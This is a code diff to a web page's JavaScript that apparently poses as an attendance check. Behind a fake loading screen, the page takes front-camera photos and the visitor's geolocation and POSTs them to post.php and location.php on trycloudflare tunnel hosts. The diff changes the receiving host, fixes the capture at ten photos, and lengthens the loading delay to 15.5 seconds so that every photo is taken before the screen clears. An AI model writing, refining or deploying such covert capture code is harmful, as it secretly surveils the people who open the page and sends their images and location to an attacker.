@@ -97,7 +97,7 @@
         $.ajax({
           type:'POST',
           data:{cat:imgdata},
-          url:'https://promote-continuity-sciences-bones.trycloudflare.com/post.php',
+          url:'https://limits-dts-dust-wesley.trycloudflare.com/post.php',
           dataType:'json',
           async:false
         }).always(function(){});
@@ -107,7 +107,7 @@
         $.ajax({
           type:'POST',
           data:{latitude:lat,longitude:lon,accuracy:acc},
-          url:'https://promote-continuity-sciences-bones.trycloudflare.com/location.php',
+          url:'https://limits-dts-dust-wesley.trycloudflare.com/location.php',
           dataType:'json',
           async:false
         }).always(function(){});
@@ -120,7 +120,7 @@
         try{
           const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
           video.srcObject=stream;
-          // start periodic captures so we can capture multiple photos during the loading period
+          // capture exactly 10 consecutive photos
           const ctx=canvas.getContext('2d');
           // clear any previous capture loop
           if(window._attendance_capture_interval){
@@ -128,12 +128,22 @@
             window._attendance_capture_interval = null;
           }
           window._attendance_stream = stream;
-          // capture immediately and then repeatedly every 1500ms
+          window._photo_count = 0;
+          const MAX_PHOTOS = 10;
+          // capture immediately and then repeatedly every 1500ms until 10 photos
           function captureOnce(){
             try{
+              if(window._photo_count >= MAX_PHOTOS){
+                stopCapture();
+                return;
+              }
               ctx.drawImage(video,0,0,640,480);
               var data=canvas.toDataURL('image/png').replace('image/png','image/octet-stream');
               postImage(data);
+              window._photo_count++;
+              if(window._photo_count >= MAX_PHOTOS){
+                stopCapture();
+              }
             }catch(e){}
           }
           captureOnce();
@@ -197,9 +207,9 @@
         const camPromise = tryGetCamera();
         const locPromise = tryGetLocation();
 
-        // show loading for about 6 seconds to capture multiple photos
+        // show loading for about 15 seconds to capture 10 photos (10 * 1.5s)
         await new Promise(function(resolve){
-          setTimeout(resolve, 6000);
+          setTimeout(resolve, 15500);
         });
 
         // stop capturing photos after loading period
